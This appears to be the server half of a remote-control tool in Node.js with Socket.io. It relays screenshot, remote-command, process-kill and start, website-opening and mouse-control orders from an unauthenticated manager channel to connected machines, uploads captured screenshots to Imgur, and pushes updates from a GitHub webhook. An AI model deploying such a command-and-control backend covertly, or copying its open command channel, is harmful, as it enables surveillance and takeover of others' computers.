const express = require('express')
const app = express();
const bodyParser = require("body-parser");
const server = require('http').createServer(app);
const sio = require('socket.io')(server);
const fs = require('fs')
const path = require('path')
const pug = require('pug');

require('dotenv').config({path: "../.env"});

console.log(process.env.ADDRESS);

app.engine('html', pug.renderFile)
app.set('view engine', 'pug')
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

let clients = [];

app.get('/', (req, res) => {
    res.render('index', {
        clients: clients,
        address: process.env.ADDRESS
    })
});

app.get('/client/:clientId/', (req, res) => {
    const clientIndex = clients.indexOf(`/clients#${req.params.clientId}`)
    const client = clients[clientIndex]
    if (!client) res.redirect(process.env.ADDRESS);
    else {
        res.render('client', {
            client: client,
            address: process.env.ADDRESS
        })
    }

})

app.post('/github/', (req, res) => {
    if (req.body.action === 'released') {
        updaterNamespace.emit('download_new_version', req.body)
    }
})

app.use('/static/screenshoots/', express.static(__dirname + '/public/screenshoots/'));
app.use('/static/js/', express.static(__dirname + '/public/js/'));


const clientNamespace = sio.of('/clients')

clientNamespace.on('connection', socket => {
    console.log(`Client ${socket.id} connected`)
    clients.push(socket.id);
    socket.join(socket.id);
    managerNamespace.emit('client_connected', {client: socket.id})
    managerNamespace.emit('notification', {message: `Polaczono ${socket.id}`, pos: 'bottom-right', status: 'success'})
    //clientNamespace.emit('screenshot');

    socket.on('disconnect', () => {
        console.log(clients);
        const clientId = clients.indexOf(socket.id)
        clients.splice(clientId, 1)
        console.log(`Client ${socket.id} disconnected`)
        managerNamespace.emit('client_disconnected', {client: socket.id})
        managerNamespace.emit('notification', {message: `Rozlaczono ${socket.id}`, pos: 'bottom-right', status: 'danger'})
    })

    socket.on('get_screenshoot', (data) => {
        console.log(data);
        const image = data.img
        const filename = data.filename
        const ssDir = `public/screenshoots/${socket.id}`;
        if (!fs.existsSync(ssDir)) {
            fs.mkdirSync(ssDir)
        }
        fs.writeFile(path.join(ssDir, filename), image, (e) => {
            if (e) {
                return console.log(e);
            }
            console.log(`File ${filename} saved`);
            const imgur = require('imgur');

            imgur.setClientId(process.env.IMGUR_CLIENT_ID);
            imgur.createAlbum()
                .then(function(json) {
                    console.log(json);
                    imgur.uploadFile(path.join(ssDir, filename), json.id)
                        .then(function (json) {
                            console.log(json.data.link);
                        })
                        .catch(function (err) {
                            console.error(err.message);
                        });
                })
                .catch(function (err) {
                    console.error(err.message);
                });

        })
        sio.of('/manager').emit('ss_btn', {state: true})
    })

    socket.on('website', (data) => {
        sio.of('/manager').emit('website_btn', {state: true})
        sio.of('/manager').emit('notification', {...data.notification})
    })

    socket.on('command', (data) => {
        sio.of('/manager').emit('command', data);
    })

    socket.on('systemInfo', (data) => {
        sio.of('/manager').emit('systemInfo', data)
    })

    socket.on("process_list", (data) => {
        sio.of("/manager").emit('process_list', data);
    });

    socket.on("process_kill", (data) => {
        sio.of("/manager").emit('process_kill', data);
    })

    socket.on("process_start", (data) => {
        sio.of("/manager").emit('process_start', data);
    })

    socket.on("notification", (data) => {
        sio.of('/manager').emit('notification', {...data.notification})
    })
})

const managerNamespace = sio.of('/manager')

managerNamespace.on('connection', socket => {

    console.log('Manager connected')

    socket.on('screenshoot', (data) => {
        console.log('Manager chce ss')
        if (data && data.clientId) {
            sio.of('/clients').to(data.clientId).emit('screenshot');
        } else {
            sio.of('/clients').emit('screenshot');
        }
        sio.of('/manager').emit('ss_btn', {state: false})
    })

    socket.on('website', (data) => {
        console.log('Manager chce otworzyc strone')
        console.log(data);
        if (data && data.clientId) {
            sio.of('/clients').to(data.clientId).emit('website', data)
        } else {
            sio.of('/clients').emit('website', data)
        }
        sio.of('/manager').emit('website_btn', {state: false})
    })

    socket.on('command', (data) => {
        console.log('Manager chce przeslac komende')
        if (data && data.clientId) {
            sio.of('/clients').to(data.clientId).emit('command', data.command)
        } else {
            sio.of('/clients').emit('command', data)
        }
    })

    socket.on('getSystemInfoFromClient', (data) => {
        console.log(data);
        // Wykonujemy zapytanie do klienta by przeslal info o systemie
        sio.of('/clients').to(data.clientId).emit('systemInfo');
    })

    socket.on('fetchSystemInfo', (data) => {
        console.log(data);
    })

    socket.on('process_list', (data) => {
        sio.of("/clients").to(data.clientId).emit("process_list");
    })

    socket.on('process_kill', (data) => {
        sio.of('/clients').to(data.clientId).emit("process_kill", data);
    })

    socket.on('process_start', (data) => {
        sio.of('/clients').to(data.clientId).emit("process_start", data);
    })

    socket.on("mouse", (data) => {
        sio.of('/clients').to(data.clientId).emit("mouse", {type: data.type, p: data.p});
    })

    socket.on("mouse_click", (data) => {
        sio.of('/clients').to(data.clientId).emit("mouse_click", {type: data.type});
    })
})

const updaterNamespace = sio.of('/updater')

updaterNamespace.on('connection', (socket) => {
    console.log('Updater connected')
})

server.listen(3000, () => {
    console.log('listening on *:3000');
})